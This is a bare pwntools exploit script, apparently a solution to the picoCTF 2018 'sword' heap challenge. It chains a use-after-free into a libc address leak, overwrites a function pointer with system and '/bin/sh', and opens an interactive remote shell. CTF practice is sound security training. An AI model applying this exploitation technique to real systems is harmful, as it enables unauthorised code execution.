from pwn import *

# p = process('./sword')
p = remote('2018shell.picoctf.com', 55713)
libc = ELF('./libc.so.6')

libc_system = libc.symbols['system']
libc_bin_sh = 0x18cd57

def forgeSword():
	p.recvuntil('Quit.')
	p.sendline('1')

def showSword(index):
	p.recvuntil('Quit.')
	p.sendline('3')
	p.recvuntil('sword?')
	p.sendline(str(index))
	p.recv(1024)
	return p.recv(1024)

def hardenSword(index, length, name, weight=-1):
	p.recvuntil('Quit')
	p.sendline('5')
	p.recvuntil('sword?')
	p.sendline(str(index))
	p.recvuntil('name?')
	p.sendline(str(length))
	p.recvuntil('name.')
	p.sendline(name)
	p.recvuntil('sword?')
	p.sendline(str(weight))

def destroySword(index):
	p.recvuntil('Quit')
	p.sendline('4')
	p.recvuntil('sword?')
	p.sendline(str(index))

def equipSword(index):
	p.recvuntil('Quit')
	p.sendline('6')
	p.recvuntil('sword?')
	p.sendline(str(index))
	return p.recv(1024)

def synthesizeSword(index1, index2):
	p.recvuntil('Quit')
	p.sendline('2')
	p.recvuntil('sword?')
	p.sendline(str(index1))
	p.recvuntil('sword?')
	p.sendline(str(index2))	

forgeSword()
forgeSword()
forgeSword()
destroySword(0)
hardenSword(1, 32, 'lolololol', -1)
hardenSword(2, 200, 'qwertyuiopasdfghjklzxcvbnm', -1)
destroySword(1)
destroySword(2)
equipSword(1)
leak = p.recv(20)
leak = u64(leak[12:18] + '\x00\x00')
offset = 0x3c4b78
libc_base = leak - offset
system_addr = libc_base + libc_system
binsh_addr = libc_base + libc_bin_sh

forgeSword()
forgeSword()
forgeSword()

p.recvuntil('Quit')
p.sendline('5')
p.recvuntil('sword?')
p.sendline('1')
p.recvuntil('name?')
p.sendline('257')

hardenSword(2, 32, 'AAAABBBB' + p64(binsh_addr) + p64(system_addr), -1)

p.recvuntil('Quit')
p.sendline('6')
p.recvuntil('sword?')
p.sendline('1')

p.interactive()




